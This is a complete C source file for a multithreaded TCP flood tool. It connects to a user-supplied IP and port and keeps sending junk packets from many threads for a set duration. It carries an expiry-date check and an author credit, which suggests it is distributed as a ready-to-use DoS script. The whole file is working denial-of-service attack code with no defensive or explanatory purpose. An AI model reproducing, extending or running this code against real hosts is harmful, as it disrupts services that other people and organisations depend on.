#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>

#define PACKET_SIZE 1024         // Size of each packet in bytes
#define MAX_RETRIES 3           // Max number of retries if attack fails
#define EXPIRY_DATE_YEAR 2025
#define EXPIRY_DATE_MONTH 3
#define EXPIRY_DATE_DAY 20

// Global variables for IP, Port, Duration, and Thread count
char *target_ip = NULL;
int target_port = 0;
int num_threads = 1;
int attack_duration = 60;  // Default attack duration (in seconds)

// Function to check if the script has expired
int is_script_expired() {
    time_t current_time = time(NULL);
    struct tm *current_date = localtime(&current_time);

    if (current_date->tm_year + 1900 > EXPIRY_DATE_YEAR) {
        return 1;  // Expired
    } else if (current_date->tm_year + 1900 == EXPIRY_DATE_YEAR) {
        if (current_date->tm_mon + 1 > EXPIRY_DATE_MONTH) {
            return 1;  // Expired
        } else if (current_date->tm_mon + 1 == EXPIRY_DATE_MONTH) {
            if (current_date->tm_mday > EXPIRY_DATE_DAY) {
                return 1;  // Expired
            }
        }
    }

    return 0;  // Not expired
}

// Function to handle the flooding attack
void* flood_attack(void* thread_id) {
    int sock;
    struct sockaddr_in server_addr;
    char data[PACKET_SIZE];
    memset(data, 'A', sizeof(data));  // Fill the data buffer with 'A's for the attack
    int retries = 0;
    int success = 0;

    while (retries < MAX_RETRIES && !success) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket creation failed");
            retries++;
            continue;  // Retry on failure
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        server_addr.sin_addr.s_addr = inet_addr(target_ip);

        // Attempt to connect to the target IP and Port
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
            retries++;
            close(sock);
            continue;  // Retry on connection failure
        }

        // Start sending packets
        time_t start_time = time(NULL);
        while (time(NULL) - start_time < attack_duration) {
            if (send(sock, data, PACKET_SIZE, 0) < 0) {
                perror("Send failed");
                retries++;
                break;  // Break out to retry
            }
        }

        close(sock);
        success = 1; // Success if the attack completed
    }

    if (!success) {
        printf("Attack failed after %d retries\n", retries);
    } else {
        printf("Attack completed successfully\n");
    }
    return NULL;
}

// Function to parse command-line arguments
void parse_arguments(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <IP> <Port> <Duration> <Threads>\n", argv[0]);
        exit(1);
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    attack_duration = atoi(argv[3]);
    num_threads = atoi(argv[4]);

    if (target_port <= 0 || num_threads <= 0 || attack_duration <= 0) {
        printf("Invalid arguments. Please provide valid IP, Port, Duration, and Threads.\n");
        exit(1);
    }
}

// Main function
int main(int argc, char *argv[]) {
    // Check if the script has expired
    if (is_script_expired()) {
        printf("Error: This script has expired as of 20 March 2025.\n");
        exit(1);
    }

    // Print the developer info
    printf("Made and Owner by @MExDEVELOPER\n");

    // Parse arguments for IP, Port, Duration, and Threads
    parse_arguments(argc, argv);

    // Thread creation for simultaneous attacks
    pthread_t threads[num_threads];

    // Start the flooding attack in multiple threads
    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, flood_attack, (void*)(long)i) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("All attacks completed successfully.\n");
    return 0;
}
